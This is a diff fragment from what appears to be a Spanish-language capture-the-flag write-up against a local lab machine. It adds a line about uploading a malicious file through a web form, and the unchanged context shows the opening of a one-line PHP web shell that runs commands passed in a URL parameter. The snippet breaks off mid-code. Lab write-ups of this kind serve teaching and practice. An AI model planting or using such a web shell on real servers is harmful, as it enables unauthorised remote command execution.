@@ -14,7 +14,7 @@ Encontraremos el puerto 80 web abierto, por lo cual iremos al buscador y vamos a
 ```Firefox
 https://172.17.0.2:80
 ```
-
+En la pagina se pueden subir archivos asi que vamos a intentar intruir con algun archivo malicioso.
 ```Linux                                
 <?php 
 system($_GET[' cmd ']); 
